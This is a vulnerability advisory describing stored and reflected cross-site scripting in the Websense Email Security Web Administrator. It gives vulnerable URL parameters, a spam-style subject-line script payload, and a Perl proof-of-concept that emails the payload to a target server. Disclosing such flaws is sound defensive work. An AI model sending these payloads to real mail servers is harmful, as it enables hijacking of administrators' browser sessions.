Background:
===========

Websense Email Security software incorporates multiple layers of
real-time Web security and data security intelligence to provide
leading email protection from converged email and Web 2.0 threats.
It helps to manage outbound data leaks and compliance risk, and enables
a consolidated security strategy with the trusted leader in Essential
Information Protection.

(Product description from Websense Website)

The Websense Email Security Web Administrator is a webfrontend, which
enables you to access the message administration, directory management
and to view the log.



Description:
============

1. XSS in webfrontend:
----------------------

The webfrontend do not properly sanitize some variables before being
returned to the user.

http://<target>:8181/web/msgList/viewmsg/actions/msgAnalyse.asp \
?Queue=Network%20Security&FileName=[XSS]&IsolatedMessageID=[XSS] \
&ServerName=[XSS]&Dictionary=[XSS]&Scoring=[XSS]&MessagePart=[XSS]

http://<target>:8181/web/msgList/viewmsg/actions/msgForwardToRis \
kFilter.asp?Queue=[XSS]&FileName=[XSS]&IsolatedMessageID=[XSS]& \
ServerName=[XSS]

http://<target>:8181/web/msgList/viewmsg/viewHeaders.asp?Queue= \
[XSS]&FileName=[XSS]&IsolatedMessageID=[XSS]&ServerName=[XSS]

This can be exploited to execute arbitrary HTML and script code in a
user's browser session in context of the Web Administrator frontend.


2. XSS in webfrontend through a Mail Subject:
---------------------------------------------

The Subject of an email sent through the Websense Mail Security
server is not properly sanitized before shown in the Web Administrator
frontend.

Script code like "><script>alert('X')</script> will be executed in
the users's browser in context of the Web Administrator frontend.

The Mail has to be hold in a Queue to execute the code if the
administrator checks it. A Subject like

VIAGRA"><script>alert('XSS')</script>

will result in a hold in the Anti Spam Queue.



Proof of Concept :
==================

#!/usr/bin/perl
use MIME::Lite;
use Net::SMTP;

(($server = $ARGV[0]) && ($rcpt = $ARGV[1])) || die "Usage: $0",
"<server> <Recipient> \n";

my $from_address = '<xss@mail.com>';
my $to_address = "<" . $rcpt . ">";
my $mail_host = $server;

my $subject = 'VIAGRA XSS File "><BODY ONLOAD=alert(\'XSS\')>';
my $message_body = "XSS Test File";

$msg = MIME::Lite->new (
  From => $from_address,
  To => $to_address,
  Subject => $subject,
  Type =>'multipart/mixed'
) or die "Error creating multipart container: $!\n";

$msg->attach (
  Type => 'TEXT',
  Data => $message_body
) or die "Error adding the text message part: $!\n";

MIME::Lite->send('smtp', $mail_host, Timeout=>60);
$msg->send;

=========
